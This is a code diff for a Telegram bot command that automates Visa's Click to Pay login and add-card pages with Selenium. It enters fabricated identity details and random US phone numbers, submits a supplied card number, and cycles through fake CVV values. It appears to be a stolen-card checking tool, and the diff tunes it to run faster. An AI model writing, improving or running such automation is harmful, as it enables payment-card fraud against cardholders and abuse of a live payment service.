@@ -5499,9 +5499,9 @@ async def ko_cmd(update, context):
     }
     Process(target=run_ko_process, args=(card_input, update_dict), daemon=True).start()
 
-# ==== 7.5 /zz Command (FINAL ELITE VERSION) ==== #
+# ==== 7.5 /zz Command (FAST OPTIMIZED VERSION) ==== #
 def run_zz_process(card_input, update_dict):
-    """ZZ Mode - FINAL (FAST + STABLE + PERFECT INPUT/CLICKS)"""
+    """ZZ Mode - FAST OPTIMIZED (10–18s target)"""
     import random, traceback, time
     from selenium.webdriver.common.by import By
     from selenium.webdriver.support.ui import WebDriverWait
@@ -5511,9 +5511,8 @@ def run_zz_process(card_input, update_dict):
     start = time.time()
     driver = None
 
-    def safe_click(el):
+    def fast_click(el):
         try:
-            driver.execute_script("arguments[0].scrollIntoView({block:'center'});", el)
             driver.execute_script("arguments[0].click();", el)
         except:
             pass
@@ -5522,19 +5521,19 @@ def run_zz_process(card_input, update_dict):
         killer_edit_message(update_dict, "⚙️ Processing your request...")
 
         driver = create_killer_driver()
-        wait = WebDriverWait(driver, 3)
+        wait = WebDriverWait(driver, 2)  # ⚡ faster wait
 
         driver.get("https://src.visa.com/login")
 
         # ================================
-        # COOKIE
+        # COOKIE (FASTER)
         # ================================
         try:
-            time.sleep(1.5)
-            btn = WebDriverWait(driver, 6).until(
+            time.sleep(0.8)
+            btn = WebDriverWait(driver, 4).until(
                 EC.presence_of_element_located((By.CSS_SELECTOR, "a.wscrOk"))
             )
-            safe_click(btn)
+            fast_click(btn)
         except:
             pass
 
@@ -5545,26 +5544,20 @@ def run_zz_process(card_input, update_dict):
 
         wait.until(EC.visibility_of_element_located((By.ID, "email-input"))).send_keys(identity["email"])
 
-        safe_click(wait.until(EC.presence_of_element_located(
+        fast_click(wait.until(EC.presence_of_element_located(
             (By.XPATH, "//button[.//div[normalize-space()='Continue']]")
         )))
 
         phone = wait.until(EC.presence_of_element_located((By.ID, "login-phone-input-number")))
         driver.execute_script("arguments[0].value='';", phone)
 
-        # ✅ VALID USA PHONE
+        # valid US phone
         area = random.choice(["201","202","203","205","206","207","208","209"])
         exchange = random.choice(["201","202","303","404","505","606","707","808","909"])
-        line = "".join(random.choices("0123456789", k=4))
-        phone.send_keys(area + exchange + line)
+        phone.send_keys(area + exchange + "".join(random.choices("0123456789", k=4)))
 
-        safe_click(wait.until(EC.presence_of_element_located(
-            (By.XPATH, "//input[@type='checkbox']")
-        )))
-
-        safe_click(wait.until(EC.presence_of_element_located(
-            (By.XPATH, "//button[.//div[normalize-space()='Next']]")
-        )))
+        fast_click(wait.until(EC.presence_of_element_located((By.XPATH, "//input[@type='checkbox']"))))
+        fast_click(wait.until(EC.presence_of_element_located((By.XPATH, "//button[.//div[normalize-space()='Next']]"))))
 
         # ================================
         # STEP 2 — CARD
@@ -5583,15 +5576,16 @@ def run_zz_process(card_input, update_dict):
         card_box.send_keys(cc)
 
         wait.until(EC.visibility_of_element_located((By.ID, "expiration-input"))).send_keys(mm + yy)
-        wait.until(EC.visibility_of_element_located((By.ID, "cvv-input"))).send_keys(wrong_cvv)
+
+        cvv_field = wait.until(EC.visibility_of_element_located((By.ID, "cvv-input")))
+        cvv_field.send_keys(wrong_cvv)
 
         # ================================
         # STEP 3 — ADDRESS
         # ================================
         try:
             country = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '[data-testid="region-select"]')))
-            val = country.get_attribute("value") or ""
-            if "United States" not in val:
+            if "United States" not in (country.get_attribute("value") or ""):
                 country.click()
                 country.clear()
                 country.send_keys("United States")
@@ -5604,12 +5598,12 @@ def run_zz_process(card_input, update_dict):
         wait.until(EC.visibility_of_element_located((By.ID, "stateProvinceCode-input"))).send_keys(identity["state"])
         wait.until(EC.visibility_of_element_located((By.ID, "zip-input"))).send_keys(identity["zip"])
 
-        safe_click(wait.until(EC.presence_of_element_located(
-            (By.XPATH, "//div[normalize-space()='Add card']")
-        )))
+        # cache button once
+        add_btn = wait.until(EC.presence_of_element_located((By.XPATH, "//div[normalize-space()='Add card']")))
+        fast_click(add_btn)
 
         # ================================
-        # STEP 4 — CVV LOOP (FAST)
+        # STEP 4 — CVV LOOP (OPTIMIZED)
         # ================================
         used = {wrong_cvv}
 
@@ -5620,16 +5614,13 @@ def run_zz_process(card_input, update_dict):
             used.add(fake)
 
             try:
-                field = wait.until(EC.visibility_of_element_located((By.ID, "cvv-input")))
-                field.click()
-                field.send_keys(Keys.CONTROL + "a")
-                field.send_keys(fake)
+                cvv_field.click()
+                cvv_field.send_keys(Keys.CONTROL + "a")
+                cvv_field.send_keys(fake)
 
-                safe_click(wait.until(EC.presence_of_element_located(
-                    (By.XPATH, "//div[normalize-space()='Add card']")
-                )))
+                fast_click(add_btn)  # reuse cached button
 
-                time.sleep(0.4)
+                time.sleep(0.25)  # ⚡ reduced delay
 
             except:
                 pass
@@ -5649,7 +5640,6 @@ def run_zz_process(card_input, update_dict):
 
     except Exception as e:
         trace = traceback.format_exc()
-
         killer_edit_message(update_dict, "❌ Request timeout, try again.")
         killer_admin_report("zz", trace, driver)
         record_cmd_failure("zz")
